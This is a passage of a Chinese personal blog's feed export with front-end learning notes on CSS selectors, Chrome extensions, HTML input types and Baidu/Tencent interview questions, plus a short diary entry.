&lt;div id=&quot;zc&quot;&gt;id选择器2&lt;/div&gt;    
</code></pre></li>
</ul>
<p>开始以为浏览器只会渲染第一个，但是通过实验。发现以上两个都被渲染。看来浏览器在解析的时候直接通过<b>zc</b>来查找，但是通过HTML DOM就只会返回第一个 id=’zc’的DOM元素.</p>
<ul>
<li>属性选择器<br>属性选择器是对指定的属性来进行设置，如果html元素中有改元素，则work</li>
</ul>
<pre><code>#style
[demo]}{
    color: #E9967A;
    font-size: 14px;
    font-family: serif;
}

.zc{
    border: 1px solid #00008B;
}

#html
&lt;div class=&quot;zc&quot; demo=&apos;class&apos;&gt;&lt;/div&gt;
&lt;div id=&quot;zc&quot; demo=&apos;id&apos;&gt;&lt;/div&gt;
</code></pre><style>
    .zc-attr [demo]{
        color: #E9967A;
        font-size: 14px;
        font-family: serif;
    }
    .zc-attr .zc{
        border: 1px solid #00008B;
    }

    .zc-attr span{
        color: blue;
    }
</style>
<div class="zc-attr">
    <span id="zc" demo="id">这是id为zc的元素</span><br>
    <span class="zc" demo="class">这是class为zc的元素 &nbsp;&nbsp;&nbsp;<span>这是在class内部，没有demo属性的元素</span></span>
</div>

可见属性选择器只关心html元素中是否包含该属性。当然每个选择器都可以与其他选择器一起使用，达到更好的筛选效果。

其中，比较高级的就是结合正则表达式来选择元素，设置样式。

*

html其中比较有意思的地方就是层次结构，类比“树”!

![http://7xklhg.com1.z0.glb.clouddn.com/html-tree.png](http://7xklhg.com1.z0.glb.clouddn.com/html-tree.png)

结构是以html作为根节点，以后每个元素有可能是另一个元素的子元素或者父元素。而且这张图对我理解后面的几种选择器也是大有帮组。


* 后代选择器

<del>顾名思义，就是获得了一个元素所有的后代的权限可以来设置样式。</del>

错了，其实是浏览器从左到右来筛选元素。


        =====style=======
        div #zc{
            color: #6495ED;
        }
        p #zc{
            color: #00FFFF;
        }

        =====html========
        <div>
            <span id="zc">demo-div</span>
        </div>
        <p>
            <span id="zc">demo-p</span>
        </p>


<style>
        div.demo #zc{
            color: #6495ED;
        }
        p.demo #zc{
            color: #00FFFF;
        }

</style>

<p><div class="demo"><br>    <span id="zc">demo-div</span><br></div></p>
<p class="demo"><br>    <span id="zc">demo-p</span><br></p>



<p>其中后代选择器作用是通过空格的形式来筛选元素。否则变为了设置改id(class)的元素了。</p>
<ul>
<li>子元素选择器</li>
</ul>
<p>子元素选择器和后台选择器从语义上来区分我还是真的有点模糊。从范围来看应该是后代选择器&gt;子代选择器。子代选择器就是亲儿子嘛！</p>
<p><b>语法</b><br>    使用子结合符（&gt;）</p>
<pre><code>=====style=====
h3 &gt; span{
    color:red;
}
=====html======
&lt;h3&gt;
    &lt;span&gt;大儿子&lt;/span&gt;
    &lt;span&gt;二儿子&lt;/span&gt;
&lt;/h3&gt;
&lt;h3&gt;
    &lt;em&gt;
        &lt;span&gt;大孙子&lt;/span&gt;
    &lt;/em&gt;
    &lt;span&gt;二儿子&lt;/span&gt;
&lt;/h3&gt;
</code></pre><style>
    h3.demo > span{
            color:red;
    }
</style>
<h3 class="demo"><span>大儿子</span>&nbsp;&nbsp;<span>二儿子</span></h3>
<h3 class="demo"><em><span>大孙子</span></em>&nbsp;&nbsp;<span>二儿子</span></h3>


* 相邻兄弟选择器

相邻兄弟嘛，就必须<em>同一个父母</em>，并且只能选择紧邻的一个。

<b>语法</b>
    相邻兄弟结合符，通过（＋）来表示
我觉得通过list来解释还比较清晰。


        =======style=====
        li + li{
            color: #6495ED;
        }
        =======html======
        <ol>
            <li>list1</li>
            <li>list2</li>
            <li>list3</li>
        </ol>

        //其中list1不能被选择，而list2是list1的兄弟，同时list3也是list1的兄弟。所以，表现如下！

<style>
    .demo li + li{
            color:#6495ED;
        }    
</style>

<ol class="demo"><br>    <li>list1</li><br>    <li>list2</li><br>    <li>list3</li><br></ol>



<ul>
<li>伪类</li>
</ul>
<p>最常用的就是a标签的几个了。:link, :visited, :hover, :active(love-hate)</p>
<ul>
<li>伪元素</li>
</ul>
<p>其中在编辑页面是可能回经常用到 :first-line[第一行], :first-letter[第一个字母], ::selection[选取内容] ， not(p)［非p的内容］ </p>
<p>其中伪元素还有限定的属性</p>
<table>
<thead>
<tr>
<th style="text-align:left">first_letter</th>
<th style="text-align:right">first_line</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">所有font属性</td>
<td style="text-align:right">所有font属性</td>
</tr>
<tr>
<td style="text-align:left">color</td>
<td style="text-align:right">color</td>
</tr>
<tr>
<td style="text-align:left">所有background属性</td>
<td style="text-align:right">所有background属性</td>
</tr>
<tr>
<td style="text-align:left">所有margin熟悉</td>
<td style="text-align:right">word-spacing</td>
</tr>
<tr>
<td style="text-align:left">所有padding</td>
<td style="text-align:right">letter-spacing</td>
</tr>
<tr>
<td style="text-align:left">所有border</td>
<td style="text-align:right">text-decoration</td>
</tr>
<tr>
<td style="text-align:left">text-decoration</td>
<td style="text-align:right">vertical-align</td>
</tr>
<tr>
<td style="text-align:left">vertical-align</td>
<td style="text-align:right">text-transform</td>
</tr>
<tr>
<td style="text-align:left">text-transform</td>
<td style="text-align:right">line-height</td>
</tr>
<tr>
<td style="text-align:left">line-height</td>
<td style="text-align:right">clear</td>
</tr>
<tr>
<td style="text-align:left">float</td>
<td style="text-align:right">text-shadow</td>
</tr>
<tr>
<td style="text-align:left">letter-spacing</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:left">word-spacing</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:left">clean</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:left">text-shadow</td>
</tr>
</tbody>
</table>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="http://www.w3school.com.cn/css/index.asp" target="_blank" rel="external">http://www.w3school.com.cn/css/index.asp</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我认为css的选择器目的就是我们提供了一个快捷的方式，而我们常用的无非就是元素、类、ID等几种选择器，而其他的几种使用的真的是不多。但是在有的情况下使用这些选择器，你会发现效率大大提高。&lt;/p&gt;
&lt;p&gt;(PS: 尼玛，才发现之前写过总结过一次)&lt;/p&gt;
&lt;h4 id=&quot;选择器种类&quot;&gt;&lt;a href=&quot;#选择器种类&quot; class=&quot;headerlink&quot; title=&quot;选择器种类&quot;&gt;&lt;/a&gt;选择器种类&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;元素选择器&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;#css代码
div{background:#ccc;}
zc{background:#ccc;}

#html代码
&amp;lt;div&amp;gt;
    &amp;lt;span&amp;gt;这是一段文字&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;zc&amp;gt;这是自定义标签&amp;lt;/zc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;b&gt;展示如下&lt;/b&gt;&lt;/p&gt;
&lt;zc style=&quot;background:#ccc;display:border;&quot;&gt;这是自定义标签&lt;/zc&gt;

&lt;div style=&quot;background:#ccc&quot;&gt;&lt;span&gt;这是一段文字&lt;/span&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://blog.zchub.cn/tags/front-end/"/>
    
      <category term="css" scheme="http://blog.zchub.cn/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>dairy-2015/12/21</title>
    <link href="http://blog.zchub.cn/2015/12/21/dairy-2015-12-21/"/>
    <id>http://blog.zchub.cn/2015/12/21/dairy-2015-12-21/</id>
    <published>2015-12-21T20:45:12.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="沉思录"><a href="#沉思录" class="headerlink" title="沉思录"></a>沉思录</h2><p>每当一个人的灵魂空虚的时候，就容易想得多。来了杭州一个月，身上没有什么变化。和当初来之前下的决心有很大的距离，之前是打算学点东西。但是这一个月下来，我发现自己除了玩得比较厉害，其他没什么不同。我很幸运，遇到的公司的基础设施非常的好，资源也非常滴丰厚，可自己并没有好好地利用。</p>
<p>走的时候，栋哥也是嘱咐我，不要忘记自己，要随时都要有一颗学习的心。不过回想这一个月以来干了什么？工作日上班，周日睡和吃（不过也不见长，有屁用！）。</p>
<p>思前想后，觉得这样下去，肯定是要出问题的，必须要纠正自己的道路。所以，在自己的博客当中认真的写下这篇日记，以做警惕。不要迷失自己，未来竞争会越来越大。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;沉思录&quot;&gt;&lt;a href=&quot;#沉思录&quot; class=&quot;headerlink&quot; title=&quot;沉思录&quot;&gt;&lt;/a&gt;沉思录&lt;/h2&gt;&lt;p&gt;每当一个人的灵魂空虚的时候，就容易想得多。来了杭州一个月，身上没有什么变化。和当初来之前下的决心有很大的距离，之前是打算学点东西。但
    
    </summary>
    
      <category term="生活日记" scheme="http://blog.zchub.cn/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://blog.zchub.cn/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>chrome扩展程序</title>
    <link href="http://blog.zchub.cn/2015/11/09/chrome-crx/"/>
    <id>http://blog.zchub.cn/2015/11/09/chrome-crx/</id>
    <published>2015-11-09T19:19:51.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="自言自语"><a href="#自言自语" class="headerlink" title="自言自语"></a>自言自语</h2><p>今天斗捣鼓了一下chrome，发现我之前看到的只是冰山一角。通过今天下午，自己对chrome的喜爱又增加了异步！</p>
<p>##what is the cre<br>什么是chrome扩展程序呢？<br>扩展程序是一些能够修改或增强Chrome浏览器功能的小程序。就是我们平时写的网页应用[html、css、javascript]等，如果你想自己开发需要到<a href="chrome://extensions/" target="_blank" rel="external">chrome://extensions/</a>下打包扩展。</p>
<p><b>温馨提示：</b>亲，必须是chrome浏览器哟！<br>但是，Google需要收$5的开发者费用意思意思。当然并不是生财之道，为了防止恶意程序。</p>
<p>开发教程：<a href="http://blog.jobbole.com/46608/" target="_blank" rel="external">http://blog.jobbole.com/46608/</a></p>
<a id="more"></a>
<h2 id="干货"><a href="#干货" class="headerlink" title="干货"></a>干货</h2><p>环境：<b>chrome浏览器</b></p>
<ul>
<li><a href="http://www.ggfwzs.com/" target="_blank" rel="external">谷歌访问助手</a></li>
</ul>
<p>为了访问谷歌商店，这个是必须的。安装之后之后我们就可以使用谷歌搜索，谷歌商店等功能。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/%E7%A9%BF%E8%B6%8A/njdjpgffklilbojbobbfecfcgofebbco?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">穿越</a></li>
</ul>
<p><b>免费！！！</b>我们每天可以累计使用两个小时，还是比较爽滴。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">vimium</a></li>
</ul>
<p>vim+chromium 快捷键操作浏览器，觉得非常的炫酷。</p>
<hr>
<p>当然作为一个前端程序员，还是要有点专业精神。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">chrome useragent spoofer</a></li>
</ul>
<p>chrome用户代理，可以欺骗服务端，模拟各种浏览器。同时包括了Android，IOS等。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/window-resizer/kkelicaakdanhinjdeammmilcgefonfh?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">resize window</a></li>
</ul>
<p>调节浏览器窗口大小，可以调节在开发或学习响应式界面的时候worked。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/web%E5%89%8D%E7%AB%AF%E5%8A%A9%E6%89%8Bfehelper/pkgccpejnmalmdinmhkkfafefagiiiad?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">FeHelper</a></li>
</ul>
<p>WEB前端助手,<a href="http://www.baidufe.com/fehelper" target="_blank" rel="external">介绍</a>。功能包括字符串编解码、图片base64编码、代码压缩、美化、JSON格式化、正则表达式、时间转换工具、二维码生成器、编码规范检测、页面性能检测、栅格检测、JS运行效率分析等，异常强大。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/markdown-editor/ekdcaddpmiodcipjfmffhhefijpdckaf?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">markdownEditor</a></li>
</ul>
<p>对于经常使用markdown的小盆友应该灰常喜欢。离线应用，然后非常简洁。不过我发现使用中也有不好的地方，就是没有高亮效果。如果字多了就显得混乱。</p>
<ul>
<li><a href="https://chrome.google.com/webstore/detail/octotree/bkhaagjahfmjljalopjnoealnfndnagc?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">Octotree</a> </li>
</ul>
<p>github插件，在我们查看github项目的时候，给我们提供一个树形结构的视图。同时，该插件还支持下载项目中的文件。</p>
<ul>
<li><p>music </p>
<ul>
<li><p><a href="https://chrome.google.com/webstore/detail/earbits-radio-free-music/mgkjffcdjblaipglnmhanakilfbniihj?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">Earbits电台</a></p>
<p>发现自己并不会使用，哈哈。</p>
</li>
<li><p><a href="https://chrome.google.com/webstore/detail/%E8%99%BE%E5%A3%B3-musiccase/pliopboejkkmebobeabhdpmpngigicig?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">虾壳</a></p>
<p>喜爱小虾米的用户的福音。目前，本人正使用该插件，听着歌，敲着字。嗯，惬意。</p>
</li>
</ul>
</li>
<li>games<ul>
<li><a href="https://chrome.google.com/webstore/detail/codetank/akhhjlibdipmbloibedinfhloejbbkok?hl=zh-CN&amp;utm_source=chrome-ntp-launcher" target="_blank" rel="external">codetank</a><br>tencent开发的基于html5,javascript的游戏，同时开发者可以自己根据API来写自己的游戏。</li>
</ul>
</li>
</ul>
<p>更多资源：<a href="https://www.baidu.com/link?url=VHYgrtLwh4nj3tcwZV2BwMizP_NTBhR_t-p5OYulLDe8hyrAdDjlzAlo_he0k84a&amp;wd=&amp;eqid=b5db42140003714f0000000556409c05" target="_blank" rel="external">https://www.baidu.com/link?url=VHYgrtLwh4nj3tcwZV2BwMizP_NTBhR_t-p5OYulLDe8hyrAdDjlzAlo_he0k84a&amp;wd=&amp;eqid=b5db42140003714f0000000556409c05</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;自言自语&quot;&gt;&lt;a href=&quot;#自言自语&quot; class=&quot;headerlink&quot; title=&quot;自言自语&quot;&gt;&lt;/a&gt;自言自语&lt;/h2&gt;&lt;p&gt;今天斗捣鼓了一下chrome，发现我之前看到的只是冰山一角。通过今天下午，自己对chrome的喜爱又增加了异步！&lt;/p&gt;
&lt;p&gt;##what is the cre&lt;br&gt;什么是chrome扩展程序呢？&lt;br&gt;扩展程序是一些能够修改或增强Chrome浏览器功能的小程序。就是我们平时写的网页应用[html、css、javascript]等，如果你想自己开发需要到&lt;a href=&quot;chrome://extensions/&quot;&gt;chrome://extensions/&lt;/a&gt;下打包扩展。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;温馨提示：&lt;/b&gt;亲，必须是chrome浏览器哟！&lt;br&gt;但是，Google需要收$5的开发者费用意思意思。当然并不是生财之道，为了防止恶意程序。&lt;/p&gt;
&lt;p&gt;开发教程：&lt;a href=&quot;http://blog.jobbole.com/46608/&quot;&gt;http://blog.jobbole.com/46608/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="daily-toy" scheme="http://blog.zchub.cn/categories/daily-toy/"/>
    
    
      <category term="chrome" scheme="http://blog.zchub.cn/tags/chrome/"/>
    
      <category term="crx" scheme="http://blog.zchub.cn/tags/crx/"/>
    
  </entry>
  
  <entry>
    <title>input表单类型</title>
    <link href="http://blog.zchub.cn/2015/11/05/input-type-image/"/>
    <id>http://blog.zchub.cn/2015/11/05/input-type-image/</id>
    <published>2015-11-05T10:26:15.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>今天在写页面的时候发现</p>
<pre><code>&lt;form action=&quot;test.html&quot;&gt;
    &lt;input type=&quot;image&quot;/&gt;
&lt;/form&gt;
</code></pre><p>在页面上显示的有个“提交”，但是我并没有写什么内容，有点郁闷。为什么呢？难道它和“type=submit”的效果相同？经验证发现是这样的。点击它会跳转页面</p>
<h2 id="问题发散"><a href="#问题发散" class="headerlink" title="问题发散"></a>问题发散</h2><p>使用“type=image”实质创建了一个图片控件，在点击的过程中我发现它会记录鼠标点击图片的位置，即像素点相对图片的位置。</p>
<pre><code>file:///C:/Users/Administor/Desktop/c.html?x=94&amp;y=66
</code></pre><h2 id="问题实质"><a href="#问题实质" class="headerlink" title="问题实质"></a>问题实质</h2><p>由于有与“submit”类似的“提交”功能，所以我们应避免使用。这样的会造成页面的二次提交。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>1.不使用该标签,使用image标签代替</p>
<p>2.阻止事件的默认行为</p>
<pre><code>&lt;input type=&quot;image&quot; src=&quot;../img/demo.jpg&quot; onclick=&quot;operate();return false;&quot;&gt;
</code></pre><hr>
<p>===============update by 16/03/23===============</p>
<h3 id="input标签学习"><a href="#input标签学习" class="headerlink" title="input标签学习"></a>input标签学习</h3><p>input作为表单元素之一，应该是与用户最为接近的标签了！</p>
<h4 id="类型type"><a href="#类型type" class="headerlink" title="类型type"></a>类型type</h4><p>虽然h5落地很久了，但是在开发中用的次数不是很多。而且有的时候基本是使用常见的几个，但是在h5中新增的几个类型功能却很强大。type中的shadow dom中添加了很多自己的样式以及功能。</p>
<ul>
<li>color    拾色器</li>
<li>date 控制输入日期（年，月，日）</li>
<li>datetime （废弃）</li>
<li>datetime-local （没有时区）</li>
<li>month 输入年，月，没有时区</li>
<li>time 输入时间 ，没有时区（zone）</li>
<li>week 包含年-周的数字</li>
<li>email（验证输入值在提交前为空或者是有效的邮件）</li>
<li>number 输入浮点数,不能输入其他字符</li>
<li>range  输入一个随机数</li>
<li>search    搜索框，同时带有删除输入值的效果</li>
<li>tel    输入电话号码,这需要自己限制输入的规则和最大长度来限制输入信息</li>
<li>url    输入值包含url</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题概述&quot;&gt;&lt;a href=&quot;#问题概述&quot; class=&quot;headerlink&quot; title=&quot;问题概述&quot;&gt;&lt;/a&gt;问题概述&lt;/h2&gt;&lt;p&gt;今天在写页面的时候发现&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;test.html&amp;quo
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="input" scheme="http://blog.zchub.cn/tags/input/"/>
    
      <category term="type" scheme="http://blog.zchub.cn/tags/type/"/>
    
  </entry>
  
  <entry>
    <title>9月20日面试总结</title>
    <link href="http://blog.zchub.cn/2015/09/20/summary-interview-before-20th-Sep/"/>
    <id>http://blog.zchub.cn/2015/09/20/summary-interview-before-20th-Sep/</id>
    <published>2015-09-20T11:25:26.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>虽然有机会参加百度和腾讯的面试，但是结果并不是很理想。目前已经双双败下阵来。如果说很难也谈不上，就是一些常见的基础问题。其中腾讯在技术上更侧重于深度，而且特别喜欢问计算机网络的知识。而百度就是原生的js操作问题多一点。不过每一个问题还是特别有意思。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.Cookie与sessionID是怎么传送<br>Cookie是服务器在本地机器上存的一段文本。<br>Cookie对应字段Cookie:客户端传送<br>Set-cookie：服务器向客户端设置cookie<br>cookie的使用：是由浏览器按照一定的原则在后台自动发送给服务器，如果没有规定过期时间，就是浏览器会话期。这种一般存在内存中，而不是写在硬盘上。如果设置了过期时间，就写在硬盘上。<br><a id="more"></a></p>
<p>Session是针对每个用户的，是保存在服务器上，用sessionID来区分是哪个用户变量。其中Session更加安全，因为它不会随意读取用户信息。</p>
<ul>
<li><p>Session机制<br>  Session以类似散列集方式（可能用散列集）存储。当要创建时，先检查，没有再创建，并返回给客户端保存。（sessionID既不能重复，也不能随意找到）</p>
</li>
<li><p>Session的实现方式</p>
<ul>
<li>使用cookie来实现<br>服务器给每个Session分配一个唯一的JSESSIONID，并通过Cookie发送给客户端。方式Set-cookie:JSESSIONID</li>
<li>使用URL回显的方式<br>服务器给浏览器的所有连接url中有JSESSIONID这个字段，在每次客户端点击连接都会传送该JSESSIONID,如果匹配不到就失败。（tomcat采取了这两种方式，其中<b>JSESSIONID只是tomcat对sessionid的称呼</b>）</li>
</ul>
</li>
</ul>
<p>2.CDN（content delivery network）如何放置？怎么获取的资源</p>
<ul>
<li><p>技术原理<br>  负载均衡分布，网络传送上利用缓存技术，就近获取资源。减少网络中冗余数据的重复传输，使之最小化，将广域传输转为本地或就近访问。多台Cache加速服务器且分布在不同地域，需要通过有效地机制管理Cache网络，引导用户就近访问，全局负载均衡流量。复制到网络“边缘”，缩小“请求点”与“交互点”。</p>
</li>
<li><p>传送内容<br>  互联网上传递的内容，大部分为重复的Web/FTP数据。Cache服务器具有缓存，优化数据链路性能，大部分为网页对象：（web Page object,html 等页面文件，图片文件）</p>
</li>
<li><p>工作流程与原理</p>
<p>  <img src="http://7xklhg.com1.z0.glb.clouddn.com/cdn_throry.png" alt="http://7xklhg.com1.z0.glb.clouddn.com/cdn_throry.png"><br>  CDN中间添加了Cache层，然后通过接管DNS来引导数据获得源服务器的数据。</p>
</li>
<li><p>技术手段<br>  高速缓存、镜像服务器。适用于(静态和准动态数据同步)</p>
<p>  全局负载均衡DNS通过一组预先定义好的策略，将当时最接近用户的节点地址提供给用户，使用户能够得到快速的服务。</p>
<p>  负载均衡设备负责每个节点中各个Cache的负载均衡，保证节点的工作效率；同时，负载均衡设备还负责收集节点与周围环境的信息，保持与全局负载DNS的通信，实现整个系统的负载均衡。</p>
</li>
</ul>
<p>　　高速缓存服务器（Cache）负责存储客户网站的大量信息，就像一个靠近用户的网站服务器一样响应本地用户的访问请求。</p>
<p>3.实现格雷码</p>
<p>1——[0，1]</p>
<p>2——[00,01,10,11]</p>
<p>3——[000,001,010,100,011,101,110,111]</p>
<p>之前觉得这道题不是很难，觉得就是通过把数字转换为2进制就结束了。但是忽略了一点就是。每行的数字个数相同，在3的时候，0的对应形式为‘000’，而不是‘0’。</p>
<pre><code>function getGreenCode(n){
    var len = Math.pow(2,n);
    var arr = [];
    var temp=&apos;&apos;;
    for(var j=0;j&lt;n;j++){
        temp+=0;
    }
    for(var i=0;i&lt;len;i++){
    //加“0”操作
        var str = temp+i.toString(2);
        arr.push(str.substr(str.length-n));
    }
    return arr;
};
</code></pre><p>4.在浏览器加载url的过程<br>这道题也是常考的问题，没有绝对的答案。可以扩展的内容太多。恰巧这种题就非常考验我们的知识面，所以是一道可以提高我们分值的题目。</p>
<p>思路：结合计算机网络、操作系统、浏览器渲染原理来回答。</p>
<pre><code>1.浏览器分析链接指向页面的URL；

2.浏览器向DNS(域名系统)请求解析页面所对应域名的IP地址；（浏览器缓存-&gt;系统缓存-&gt;路由器缓存）

3.DNS(域名系统)解析出重庆理工大学的IP地址为“222.178.158.61”；

三次握手（第三次目的：防止已失效的连接请求报文段突然又传到了B，因而产生错误）

4.浏览器向服务器建立TCP连接(“IP”：222.178.158.61,“port”:80)；

5.浏览器发出取命令步骤：GET/yxsz/yxsz.html；

6.服务器 www.cqut.edu.cn 给出相应,把文件/yxsz/yxsz.html发给浏览器；

7.释放TCP连接。四次握手[客户端主动关闭，等待2MSL(maxinum segment lifetime),为了保证A发送的最后一个ACK报文段能够到达B;并防止“已失效的连接请求报文段”出现在连接中》）；

8.浏览器显示“院系设置”的页面。（浏览器原理、DOM加载过程）
</code></pre><p>5.判断元素是否在区域内<br>一开始看到这个题非常懵，但是大致的思路就是通过原生的js来获取它的位置并比较。</p>
<pre><code>var a = document.getElementById(&quot;eq&quot;).offsetTop;
if (a &gt;= $(window).scrollTop() &amp;&amp; a &lt; ($(window).scrollTop()+$(window).height())) {
    alert(&quot;div在可视范围&quot;);
}
</code></pre><p>6.元素js实现domready。<br>面试前一天还看过jquery的$(document).ready(fn)与window.onload的区别，没想到后一天就遇到了。但当时并没有思考如果通过原生js来实现domReady。</p>
<pre><code>//简介版
function ready(callback){
    if(document.addEventListener){            //标准浏览器
        document.addEventListener(&apos;DOMContentLoaded&apos;,function(){
            document.removeEventListener(&apos;DOMContentLoaded&apos;,arguments.callee,false);    //注销时间，避免反复触发
            callback();        //执行函数
        },false);
    }else if(document.attachEvent){            //IE浏览器
        document.attachEvent(&apos;onreadystatechange&apos;,function(){
            if(document.readyState==&apos;complete&apos;){
                document.detachEvent(&apos;onreadystatechange&apos;,arguments.callee);
                callback();        //函数执行
            }
        });
    }else if(document.lastChild == document.body){
        callback();
    }
}
</code></pre><ul>
<li>$(document).ready(fn)与window.onload区别</li>
</ul>
<p>$(document).ready(fn)是在dom文档树加载完之后执行一个函数；window.onload是在dom文档树加载完和所有文件加载完之后执行一个函数。</p>
<ul>
<li>DOMContentLoaded<br>DOMContentLoaded是html5中新加入的。就是为了是在domcontent加载完以及资源加载前的情况，就可以进行执行代码，减少延迟。</li>
</ul>
<p>7.页面中上传文件，不跳转页面<br>    提交到插入式框架、弹出式窗口来掩盖这个现象。这里就直接在页面中写iframe来作为提交的目标。</p>
<pre><code>&lt;form action=&quot;./xxx.jsp&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot; target=&quot;aa&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;myfile&quot; /&gt;
    &lt;input type=&quot;submit&quot; /&gt;
&lt;/form&gt;

&lt;iframe name=&quot;aa&quot; src=&quot;&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;
</code></pre><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h4 id="document-querySelectorAll-与document-querySelector"><a href="#document-querySelectorAll-与document-querySelector" class="headerlink" title="document.querySelectorAll()与document.querySelector()"></a>document.querySelectorAll()与document.querySelector()</h4><p>DOM选择器，原生js操作元素获得元素，比jquery更加快。IE8也支持该方法，它接收的参数和 CSS 选择器完全一致。</p>
<p>document.querySelectorAll()：返回一个包含该元素的数组，没有就返回空数组；<br>document.querySelector()：返回指定元素节点的子树中匹配selector的集合中的第一个，如果没有匹配，返回null。</p>
<pre><code>document.getElementById();
//代替使用
document.querySelector(&quot;#test&quot;);
document.querySelectorAll(&quot;#test&quot;)[0];
</code></pre><p>例子：</p>
<p>document 中选取 class 为 test 的 div 的子元素 p 的第一个子元素。</p>
<pre><code>document.querySelector(&quot;div.test&gt;p:first-child&quot;);
document.querySelectorAll(&quot;div.test&gt;p:first-child&quot;)[0];
</code></pre><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这并不是标准答案，只是我自己在学习的过程中记录的笔记。如若有错，请指正。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;虽然有机会参加百度和腾讯的面试，但是结果并不是很理想。目前已经双双败下阵来。如果说很难也谈不上，就是一些常见的基础问题。其中腾讯在技术上更侧重于深度，而且特别喜欢问计算机网络的知识。而百度就是原生的js操作问题多一点。不过每一个问题还是特别有意思。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;1.Cookie与sessionID是怎么传送&lt;br&gt;Cookie是服务器在本地机器上存的一段文本。&lt;br&gt;Cookie对应字段Cookie:客户端传送&lt;br&gt;Set-cookie：服务器向客户端设置cookie&lt;br&gt;cookie的使用：是由浏览器按照一定的原则在后台自动发送给服务器，如果没有规定过期时间，就是浏览器会话期。这种一般存在内存中，而不是写在硬盘上。如果设置了过期时间，就写在硬盘上。&lt;br&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="interview" scheme="http://blog.zchub.cn/tags/interview/"/>
    
      <category term="baidu" scheme="http://blog.zchub.cn/tags/baidu/"/>
    
      <category term="tengxun" scheme="http://blog.zchub.cn/tags/tengxun/"/>
    
  </entry>
  
  <entry>
    <title>html5-draggable</title>
    <link href="http://blog.zchub.cn/2015/09/19/html5-draggable/"/>
    <id>http://blog.zchub.cn/2015/09/19/html5-draggable/</id>
    <published>2015-09-19T10:01:33.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>昨天去百度面试了，妥妥的接受了一波打击。再一次证明自己的基础是相当的不牢固，而且以前学习知识也有点浅尝辄止的感觉。学了新的东西就沾沾自喜，而现在一定要静下心来学习，多多发散思维。</p>
